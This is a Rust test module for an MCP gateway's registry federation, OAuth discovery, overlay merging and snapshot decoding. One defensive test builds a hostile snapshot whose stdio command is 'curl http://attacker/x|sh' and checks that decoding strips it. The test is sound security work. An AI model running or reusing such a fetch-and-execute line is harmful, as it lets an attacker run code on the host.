            server: client::ServerJson {
                name: "com.acme/crm".to_owned(),
                description: None,
                title: None,
                version: Some("1.0.0".to_owned()),
                remotes: vec![client::RemoteJson {
                    kind: "streamable-http".to_owned(),
                    url: "https://127.0.0.1:1/mcp".to_owned(),
                    headers: Vec::new(),
                    variables: BTreeMap::new(),
                }],
                packages: Vec::new(),
            },
            status: EntryStatus::Active,
            is_latest: true,
            updated_at: None,
        };
        map::federation_for_entry(registry, &entry).expect("federates")
    }

    #[tokio::test]
    async fn oauth_discovery_failure_without_prior_errors() {
        let registry = oauth_registry(true);
        let mut fed = crm_fed(&registry);
        let err = apply_oauth_discovery(&registry, &mut fed, &[])
            .await
            .unwrap_err();
        assert_eq!(err.label(), "oauth_discovery");
        assert!(!err.to_string().is_empty());
        assert!(fed.upstream.auth.credential_config.is_none());
    }

    /// Discovery output for an upstream whose resource sits below its AS
    /// issuer, as an mcpg upstream's does.
    fn discovered_as(grant_types: &[&str], profiles: &[&str]) -> DiscoveredOauth {
        DiscoveredOauth {
            resource: "https://crm.acme.example/mcp".to_owned(),
            token_endpoint: "https://crm.acme.example/oauth/token".to_owned(),
            issuer: "https://crm.acme.example".to_owned(),
            grant_types_supported: grant_types.iter().map(|s| (*s).to_owned()).collect(),
            authorization_grant_profiles_supported: profiles
                .iter()
                .map(|s| (*s).to_owned())
                .collect(),
            ..Default::default()
        }
    }

    fn with_credential(registry: &McpRegistryConfig, credential: &str) -> FederationConfig {
        let mut fed = crm_fed(registry);
        fed.upstream.auth.credential = Some(credential.to_owned());
        fed
    }

    /// An ID-JAG federation asks the IdP for a grant addressed to the
    /// upstream AS issuer; the MCP resource rides along as `resource`.
    #[test]
    fn id_jag_federation_gets_the_issuer_as_audience() {
        let registry = oauth_registry(true);
        let mut fed = crm_fed(&registry);
        assert_eq!(credential_flow(&fed), CredentialFlow::IdJag);
        let discovered = discovered_as(&[GRANT_TYPE_JWT_BEARER], &[GRANT_PROFILE_ID_JAG]);
        apply_discovered("acme", &mut fed, Ok(discovered), &[]).expect("federates");
        let cfg = fed.upstream.auth.credential_config.expect("config");
        assert_eq!(cfg["audience"], "https://crm.acme.example");
        assert_eq!(cfg["issuer"], "https://crm.acme.example");
        assert_eq!(cfg["resource"], "https://crm.acme.example/mcp");
        assert_eq!(
            cfg["redeem_token_url"],
            "https://crm.acme.example/oauth/token"
        );
    }

    /// The id-jag profile is a recommendation: an AS that lists only the
    /// jwt-bearer grant still federates.
    #[test]
    fn id_jag_federation_with_only_the_jwt_bearer_grant_federates() {
        let registry = oauth_registry(true);
        let mut fed = crm_fed(&registry);
        let discovered = discovered_as(&["authorization_code", GRANT_TYPE_JWT_BEARER], &[]);
        apply_discovered("acme", &mut fed, Ok(discovered), &[]).expect("federates");
        let cfg = fed.upstream.auth.credential_config.expect("config");
        assert_eq!(cfg["audience"], "https://crm.acme.example");
        assert_eq!(cfg["resource"], "https://crm.acme.example/mcp");
    }

    /// An AS that does not offer the jwt-bearer grant is skipped, and a
    /// prior snapshot does not paper over the answer.
    #[test]
    fn id_jag_federation_without_the_jwt_bearer_grant_is_skipped() {
        let registry = oauth_registry(true);
        let mut prior_fed = crm_fed(&registry);
        prior_fed.upstream.auth.credential_config =
            Some(serde_json::json!({ "audience": "https://crm.acme.example" }));
        let prior = [prior_fed];
        for discovered in [
            discovered_as(&[], &[]),
            discovered_as(&["authorization_code"], &[]),
            discovered_as(&["authorization_code"], &[GRANT_PROFILE_ID_JAG]),
        ] {
            let mut fed = crm_fed(&registry);
            let skip = apply_discovered("acme", &mut fed, Ok(discovered), &prior).unwrap_err();
            assert_eq!(skip.label(), "no_id_jag_support");
            assert_eq!(
                skip,
                DiscoverySkip::NoIdJagSupport {
                    issuer: "https://crm.acme.example".to_owned()
                }
            );
            assert!(fed.upstream.auth.credential_config.is_none());
        }
    }

    /// Other OAuth issuers present their token to the resource itself:
    /// the audience stays the resource and the profile is not required.
    #[test]
    fn direct_federation_keeps_the_resource_as_audience() {
        let registry = oauth_registry(true);
        let mut fed = with_credential(
            &registry,
            "cred://dev.mcpg.credential.oauth-token-exchange/com.acme/crm",
        );
        assert_eq!(credential_flow(&fed), CredentialFlow::Direct);
        apply_discovered("acme", &mut fed, Ok(discovered_as(&[], &[])), &[]).expect("federates");
        let cfg = fed.upstream.auth.credential_config.expect("config");
        assert_eq!(cfg["audience"], "https://crm.acme.example/mcp");
        assert_eq!(cfg["resource"], "https://crm.acme.example/mcp");
    }

    #[test]
    fn credential_flow_matches_the_plugin_id_exactly() {
        let registry = oauth_registry(true);
        for credential in [
            "cred://dev.mcpg.credential.oauth-id-jag-shadow/x",
            "cred://dev.mcpg.credential.oauth-client-credentials/x",
            "dev.mcpg.credential.oauth-id-jag/x",
        ] {
            let fed = with_credential(&registry, credential);
            assert_eq!(
                credential_flow(&fed),
                CredentialFlow::Direct,
                "{credential}"
            );
        }
    }

    #[tokio::test]
    async fn oauth_discovery_failure_falls_back_to_prior_snapshot() {
        let registry = oauth_registry(true);
        let mut fed = crm_fed(&registry);
        let mut prior_fed = fed.clone();
        let discovered = serde_json::json!({
            "audience": "https://crm.acme.example/mcp",
            "redeem_token_url": "https://as.acme.example/oauth2/token",
        });
        prior_fed.upstream.auth.credential_config = Some(discovered.clone());
        apply_oauth_discovery(&registry, &mut fed, &[prior_fed])
            .await
            .expect("falls back");
        assert_eq!(fed.upstream.auth.credential_config, Some(discovered));
    }

    #[tokio::test]
    async fn oauth_discovery_disabled_or_explicit_config_is_untouched() {
        // Disabled: no fetch, no error, no config.
        let registry = oauth_registry(false);
        let mut fed = crm_fed(&registry);
        apply_oauth_discovery(&registry, &mut fed, &[])
            .await
            .expect("disabled discovery is a no-op");
        assert!(fed.upstream.auth.credential_config.is_none());

        // Explicit per-server config wins: discovery never runs.
        let registry = oauth_registry(true);
        let mut fed = crm_fed(&registry);
        let explicit = serde_json::json!({ "audience": "https://pinned.example" });
        fed.upstream.auth.credential_config = Some(explicit.clone());
        apply_oauth_discovery(&registry, &mut fed, &[])
            .await
            .expect("explicit config skips discovery");
        assert_eq!(fed.upstream.auth.credential_config, Some(explicit));
    }

    /// A base config with the `acme` registry, which claims every
    /// `acme--…` overlay federation, and one operator-written federation.
    fn base_with_federation(name: &str, prefix: &str) -> AppConfig {
        let mut config = AppConfig::default();
        config.mcp.registries.push(
            serde_yaml::from_str("name: acme\nurl: \"https://registry.example\"\n")
                .expect("parse registry"),
        );
        config.mcp.federations.push(
            serde_yaml::from_str(&format!(
                "name: {name}\nupstream:\n  url: \"https://up.example/mcp\"\nnaming: {{ tool_prefix: \"{prefix}\" }}\n"
            ))
            .expect("parse federation"),
        );
        config
    }

    fn overlay_fed(name: &str, prefix: &str) -> FederationConfig {
        serde_yaml::from_str(&format!(
            "name: {name}\nupstream:\n  url: \"https://reg.example/mcp\"\nnaming: {{ tool_prefix: \"{prefix}\" }}\n"
        ))
        .expect("parse federation")
    }

    /// An overlay of `(registry, federation)` entries, each owned by its
    /// registry.
    fn overlay_of<const N: usize>(entries: [(&str, FederationConfig); N]) -> RegistryOverlay {
        let mut overlay = RegistryOverlay::default();
        for (registry, federation) in entries {
            overlay.push(registry, federation);
        }
        overlay
    }

    #[test]
    fn overlay_appends_and_operator_wins_on_collision() {
        let base = base_with_federation("acme--legacy", "crm.");
        let overlay = overlay_of([
            ("acme", overlay_fed("acme--com.acme--crm", "com.acme.crm.")),
            // Name collision with the operator entry: dropped.
            ("acme", overlay_fed("acme--legacy", "other.")),
            // Prefix collision with the operator entry: dropped.
            ("acme", overlay_fed("acme--com.acme--crm2", "crm.")),
        ]);
        let merged = merged_with_overlay(&base, &overlay).expect("merged");
        let names: Vec<_> = merged
            .mcp
            .federations
            .iter()
            .map(|f| f.name.as_str())
            .collect();
        assert_eq!(names, vec!["acme--legacy", "acme--com.acme--crm"]);
    }

    /// A synthesized federation answers to the governance its registry
    /// declares in the config being applied, not the governance it was
    /// crawled (or adopted from the cluster leader) with. One that no
    /// configured registry claims is not federated.
    #[test]
    fn overlay_federations_take_their_registrys_current_governance() {
        let mut base = AppConfig::default();
        base.mcp.registries.push(
            serde_yaml::from_str(
                "name: acme\nurl: \"https://registry.example\"\ndefaults:\n  governance:\n    minimum_trust: verified\n    allow_if: '\"crm\" in identity.groups'\n    required_scopes: [crm.read]\n",
            )
            .expect("parse registry"),
        );
        let mut crawled = overlay_fed("acme--com.acme--crm", "com.acme.crm.");
        crawled.governance.minimum_trust = Some(crate::config::TrustLevelConfig::Unauthenticated);
        let overlay = overlay_of([
            ("acme", crawled),
            ("gone", overlay_fed("gone--com.acme--hr", "com.acme.hr.")),
        ]);

        let merged = merged_with_overlay(&base, &overlay).expect("merged");
        let names: Vec<_> = merged
            .mcp
            .federations
            .iter()
            .map(|f| f.name.as_str())
            .collect();
        assert_eq!(names, vec!["acme--com.acme--crm"]);
        assert_eq!(
            merged.mcp.federations[0].governance,
            base.mcp.registries[0].defaults.governance
        );
    }

    /// A registry-synced federation that presents the caller's stored IdP
    /// sign-in keeps its mode in the snapshot followers adopt, and the
    /// merged config holds it to the rule a written one meets: without a
    /// login IdP the overlay is not applied.
    #[test]
    fn a_stored_sign_in_federation_is_adopted_and_validated_like_a_written_one() {
        use crate::config::SubjectToken;
        const WITH_LOGIN: &str = "
gateway:
  secrets:
    dir: /run/mcpg/secrets
governance:
  access:
    resource_metadata:
      resource: https://mcp.example.com/mcp
    authorization_server:
      issuer: https://mcp.example.com
      signing_secret: registry-signing-secret-0123456789
      trusted_idps:
        - issuer: https://acme.okta.com
          allowed_hosts: [acme.okta.com]
          login:
            client_id: 0oa1agent
            client_secret: login-client-secret-0123
      clients:
        - client_id: mcp-client
mcp:
  registries:
    - name: acme
      url: https://registry.example
";
        let mut fed = overlay_fed("acme--com.acme--crm", "com.acme.crm.");
        fed.upstream.auth = serde_yaml::from_str(
            "mode: oauth_impersonation\ncredential: cred://dev.mcpg.credential.oauth-id-jag/com.acme/crm\nsubject_token: idp_refresh_token\n",
        )
        .expect("parse auth");
        let overlay = overlay_of([("acme", fed)]);
        let (adopted, _) = decode_overlay_snapshot(
            &encode_overlay_snapshot(&overlay, 3).expect("snapshot encodes"),
            &[],
        )
        .expect("snapshot decodes");
        assert_eq!(
            adopted.federations[0].upstream.auth.subject_token,
            SubjectToken::IdpRefreshToken
        );

        let with_login: AppConfig = serde_yaml::from_str(WITH_LOGIN).expect("parse config");
        with_login.validate().expect("the base config validates");
        let merged = merged_with_overlay(&with_login, &adopted).expect("merged");
        assert_eq!(
            merged.mcp.federations[0].upstream.auth.subject_token,
            SubjectToken::IdpRefreshToken
        );

        let mut without_login = with_login;
        if let Some(authz) = without_login
            .governance
            .access
            .authorization_server
            .as_mut()
        {
            authz.trusted_idps[0].login = None;
        }
        without_login.validate().expect("the base config validates");
        assert!(
            merged_with_overlay(&without_login, &adopted).is_none(),
            "no login IdP: the overlay is not applied"
        );
    }

    #[test]
    fn empty_or_fully_colliding_overlay_is_a_no_op() {
        let base = base_with_federation("acme--crm", "crm.");
        assert!(merged_with_overlay(&base, &RegistryOverlay::default()).is_none());
        let overlay = overlay_of([("acme", overlay_fed("acme--crm", "whatever."))]);
        assert!(merged_with_overlay(&base, &overlay).is_none());
    }

    /// A synthesized federation answers to the registry that synthesized
    /// it, not to whichever registry's name its own name starts with.
    #[test]
    fn an_overlay_entry_answers_to_the_registry_that_synthesized_it() {
        let mut base = AppConfig::default();
        let registries = [
            ("a", "verified"),
            ("a-", "unauthenticated"),
            ("acme", "verified"),
        ];
        for (i, (name, trust)) in registries.into_iter().enumerate() {
            base.mcp.registries.push(
                serde_yaml::from_str(&format!(
                    "name: \"{name}\"\nurl: \"https://r{i}.example\"\ndefaults:\n  governance:\n    \
                     minimum_trust: {trust}\n"
                ))
                .expect("parse registry"),
            );
        }
        let overlay = overlay_of([
            // `a---srv` starts with both `a--` and `a---`.
            (
                "a-",
                overlay_fed(&map::federation_name("a-", "srv"), "srv."),
            ),
            // Synthesized by a registry this config no longer declares.
            (
                "acme--eu",
                overlay_fed(&map::federation_name("acme--eu", "hr"), "hr."),
            ),
        ]);

        let merged = merged_with_overlay(&base, &overlay).expect("merged");
        let federations: Vec<_> = merged
            .mcp
            .federations
            .iter()
            .map(|f| (f.name.as_str(), f.governance.minimum_trust))
            .collect();
        assert_eq!(
            federations,
            vec![(
                "a---srv",
                Some(crate::config::TrustLevelConfig::Unauthenticated)
            )]
        );
    }

    /// A leader that predates the owner record keeps publishing during a
    /// rolling upgrade. Its envelope is claimed the way its own followers
    /// claim it, by the one registry whose name prefixes each federation, so
    /// an upgraded follower keeps serving the registry's federations; a name
    /// two registries could both prefix, or none, is still dropped. An
    /// envelope that records owners is never claimed by name.
    #[test]
    fn an_envelope_without_owners_is_claimed_by_name() {
        let mut base = AppConfig::default();
        let registries = [
            ("acme", "verified"),
            ("a", "verified"),
            ("a-", "unauthenticated"),
        ];
        for (i, (name, trust)) in registries.into_iter().enumerate() {
            base.mcp.registries.push(
                serde_yaml::from_str(&format!(
                    "name: \"{name}\"\nurl: \"https://r{i}.example\"\ndefaults:\n  governance:\n    \
                     minimum_trust: {trust}\n"
                ))
                .expect("parse registry"),
            );
        }
        let federations = vec![
            overlay_fed("acme--com.acme--crm", "com.acme.crm."),
            overlay_fed(&map::federation_name("a-", "srv"), "srv."),
            overlay_fed("gone--com.acme--hr", "com.acme.hr."),
        ];
        let legacy = |federations: Vec<FederationConfig>| {
            let overlay = RegistryOverlay {
                federations,
                owners: BTreeMap::new(),
            };
            let mut v: serde_json::Value =
                serde_json::from_slice(&encode_overlay_snapshot(&overlay, 7).unwrap()).unwrap();
            v.as_object_mut().unwrap().remove("owners");
            serde_json::to_vec(&v).unwrap()
        };

        let (adopted, _) =
            decode_overlay_snapshot(&legacy(federations.clone()), &base.mcp.registries)
                .expect("an envelope without owners decodes");
        assert_eq!(adopted.federations.len(), 3);
        let merged = merged_with_overlay(&base, &adopted).expect("merged");
        let federated: Vec<_> = merged
            .mcp
            .federations
            .iter()
            .map(|f| (f.name.as_str(), f.governance.minimum_trust))
            .collect();
        assert_eq!(
            federated,
            vec![(
                "acme--com.acme--crm",
                Some(crate::config::TrustLevelConfig::Verified)
            )]
        );

        let recorded = RegistryOverlay {
            federations,
            owners: BTreeMap::new(),
        };
        let (adopted, _) = decode_overlay_snapshot(
            &encode_overlay_snapshot(&recorded, 7).unwrap(),
            &base.mcp.registries,
        )
        .expect("an envelope with owners decodes");
        assert!(adopted.owners.is_empty());
        assert!(merged_with_overlay(&base, &adopted).is_none());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn sync_registry_crawls_a_mock_and_synthesizes_federations() {
        use axum::routing::get;
        async fn servers() -> axum::Json<serde_json::Value> {
            axum::Json(serde_json::json!({
                "servers": [
                    { "server": { "name": "com.acme/crm", "version": "2.3.1",
                        "remotes": [{ "type": "streamable-http", "url": "https://crm.acme.example/mcp" }] },
                      "_meta": { "io.modelcontextprotocol.registry/official":
                        { "status": "active", "isLatest": true } } },
                    { "server": { "name": "com.acme/retired", "version": "1.0.0",
                        "remotes": [{ "type": "streamable-http", "url": "https://old.acme.example/mcp" }] },
                      "_meta": { "io.modelcontextprotocol.registry/official":
                        { "status": "deleted", "isLatest": true } } },
                    { "server": { "name": "com.acme/local-only", "version": "1.0.0",
                        "packages": [{ "registryType": "npm", "identifier": "acme-local" }] },
                      "_meta": { "io.modelcontextprotocol.registry/official":
                        { "status": "active", "isLatest": true } } }
                ],
                "metadata": { "count": 3 }
            }))
        }
        let app = axum::Router::new().route("/v0.1/servers", get(servers));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let registry: McpRegistryConfig = serde_yaml::from_str(&format!(
            "name: acme\nurl: \"http://{addr}\"\nregistry_safety:\n  allow_private_registry: true\n  allow_insecure_http: true\n"
        ))
        .expect("parse registry config");
        registry.validate().expect("valid registry config");

        let outcome = sync_registry(&registry, None, &[], None)
            .await
            .expect("sync");
        let federations = &outcome.federations;
        assert_eq!(federations.len(), 1, "deleted + packages-only excluded");
        assert_eq!(federations[0].name, "acme--com.acme--crm");
        assert_eq!(federations[0].upstream.url, "https://crm.acme.example/mcp");
        assert!(federations[0].upstream.protocol_version.is_auto());
        // Tombstones are dropped from the cached entry base.
        assert!(
            outcome
                .entries
                .iter()
                .all(|e| e.status != EntryStatus::Deleted)
        );
    }

    fn entry_named(
        name: &str,
        status: EntryStatus,
        updated_at: Option<&str>,
    ) -> client::RegistryEntry {
        client::RegistryEntry {
            server: client::ServerJson {
                name: name.to_owned(),
                description: None,
                title: None,
                version: Some("1.0.0".to_owned()),
                remotes: Vec::new(),
                packages: Vec::new(),
            },
            status,
            is_latest: true,
            updated_at: updated_at.map(str::to_owned),
        }
    }

    #[test]
    fn overlay_snapshot_round_trips() {
        let overlay = overlay_of([("acme", overlay_fed("acme--com.acme--crm", "com.acme.crm."))]);
        let bytes = encode_overlay_snapshot(&overlay, 42).expect("encode");
        let (decoded, fence) = decode_overlay_snapshot(&bytes, &[]).expect("decode");
        assert_eq!(decoded, overlay);
        assert_eq!(
            fence, 42,
            "the publisher's fencing token rides the envelope"
        );

        // A different snapshot version is refused, not misapplied.
        let mut v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        v["v"] = serde_json::json!(999);
        assert!(decode_overlay_snapshot(&serde_json::to_vec(&v).unwrap(), &[]).is_none());
        assert!(decode_overlay_snapshot(b"not-json", &[]).is_none());
    }

    /// An adopted snapshot carries its own safety flags, so `validate()`
    /// cannot police it: a blob asking for `stdio` also sets the
    /// `allow_stdio` that permits it, and the federation engine would spawn
    /// the named process on every replica that adopted. Decoding must
    /// therefore hold an adopted federation to the same rails
    /// `federation_for_entry` applies when synthesizing one.
    #[test]
    fn adopted_snapshot_cannot_grant_itself_stdio() {
        let hostile = serde_json::json!({
            "v": 1,
            "federations": [{
                "name": "x",
                "upstream": {
                    "url": "https://evil.test",
                    "transport": "stdio",
                    "command": "/bin/sh",
                    "args": ["-c", "curl http://attacker/x|sh"],
                    "upstream_safety": {
                        "allow_stdio": true,
                        "allow_insecure_http": true
                    }
                }
            }]
        });
        let (decoded, _) = decode_overlay_snapshot(&serde_json::to_vec(&hostile).unwrap(), &[])
            .expect("snapshot still decodes");
        let fed = &decoded.federations[0];
        assert_eq!(
            fed.upstream.transport,
            crate::config::UpstreamTransport::StreamableHttp
        );
        assert!(fed.upstream.command.is_none());
        assert!(fed.upstream.args.is_empty());
        assert!(!fed.upstream.upstream_safety.allow_stdio);
        assert!(!fed.upstream.upstream_safety.allow_insecure_http);
    }

    #[test]
    fn merge_incremental_upserts_by_name() {
        let cached = vec![
            entry_named(
                "com.acme/a",
                EntryStatus::Active,
                Some("2026-01-01T00:00:00Z"),
            ),
            entry_named(
                "com.acme/b",
                EntryStatus::Active,
                Some("2026-01-02T00:00:00Z"),
            ),
        ];
        let delta = vec![
            // Updated entry replaces its cached namesake.
            entry_named(
                "com.acme/b",
                EntryStatus::Active,
                Some("2026-01-05T00:00:00Z"),
            ),
            // New entry appears.
            entry_named(
                "com.acme/c",
                EntryStatus::Active,
                Some("2026-01-04T00:00:00Z"),
            ),
            // Tombstone replaces a live cached entry.
            entry_named(
                "com.acme/a",
                EntryStatus::Deleted,
                Some("2026-01-06T00:00:00Z"),
            ),
        ];
        let merged = merge_incremental(&cached, delta);
        assert_eq!(merged.len(), 3);
        let b = merged
            .iter()
            .find(|e| e.server.name == "com.acme/b")
            .unwrap();
        assert_eq!(b.updated_at.as_deref(), Some("2026-01-05T00:00:00Z"));
        let a = merged
            .iter()
            .find(|e| e.server.name == "com.acme/a")
            .unwrap();
        assert_eq!(a.status, EntryStatus::Deleted);
        assert_eq!(
            max_watermark(&merged).as_deref(),
            Some("2026-01-06T00:00:00Z")
        );
    }

    #[tokio::test]
    async fn incremental_crawl_sends_updated_since() {
        use axum::extract::Query;
        use axum::routing::get;
        use std::collections::HashMap;

        async fn servers(
            Query(q): Query<HashMap<String, String>>,
        ) -> axum::Json<serde_json::Value> {
            assert_eq!(
                q.get("updated_since").map(String::as_str),
                Some("2026-01-01T00:00:00Z"),
                "incremental crawl must carry the watermark"
            );
            axum::Json(serde_json::json!({ "servers": [], "metadata": {} }))
        }
        let app = axum::Router::new().route("/v0.1/servers", get(servers));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let registry: McpRegistryConfig = serde_yaml::from_str(&format!(
            "name: acme\nurl: \"http://{addr}\"\nregistry_safety:\n  allow_private_registry: true\n  allow_insecure_http: true\n"
        ))
        .expect("parse registry config");
        let client = RegistryClient::connect(&registry, None)
            .await
            .expect("connect");
        let delta = client
            .list_since("2026-01-01T00:00:00Z")
            .await
            .expect("incremental list");
        assert!(delta.is_empty());
    }

    #[test]
    fn assemble_overlay_dedupes_across_registries() {
        let registries: Vec<McpRegistryConfig> = vec![
            serde_yaml::from_str("name: first\nurl: \"https://a.example\"\n").unwrap(),
            serde_yaml::from_str("name: second\nurl: \"https://b.example\"\n").unwrap(),
        ];
        let mut runs = BTreeMap::new();
        runs.insert(
            "first".to_owned(),
            RegistryRun {
                federations: vec![overlay_fed("first--com.acme--crm", "com.acme.crm.")],
                entries: Vec::new(),
                watermark: None,
                last_full: tokio::time::Instant::now(),
                next_due: tokio::time::Instant::now(),
                synced_once: true,
            },
        );
        runs.insert(
            "second".to_owned(),
            RegistryRun {
                // Same server listed by a second registry → same derived
                // prefix → dropped.
                federations: vec![overlay_fed("second--com.acme--crm", "com.acme.crm.")],
                entries: Vec::new(),
                watermark: None,
                last_full: tokio::time::Instant::now(),
                next_due: tokio::time::Instant::now(),
                synced_once: true,
            },
        );
        let overlay = assemble_overlay(&registries, &runs);
        assert_eq!(overlay.federations.len(), 1);
        assert_eq!(overlay.federations[0].name, "first--com.acme--crm");
    }

    #[test]
    fn overlay_snapshot_without_fence_decodes_as_zero() {
        // An envelope written before tokens were stamped carries no
        // `fence` field; it must decode (as 0) rather than be dropped,
        // and 0 never outranks any stamped snapshot.
        let overlay = overlay_of([("reg", overlay_fed("reg--com.acme--crm", "com.acme.crm."))]);
        let mut v: serde_json::Value =
            serde_json::from_slice(&encode_overlay_snapshot(&overlay, 7).unwrap()).unwrap();
        v.as_object_mut().unwrap().remove("fence");
        let bytes = serde_json::to_vec(&v).unwrap();
        let (_, fence) = decode_overlay_snapshot(&bytes, &[]).expect("legacy envelope decodes");
        assert_eq!(fence, 0);
    }
}
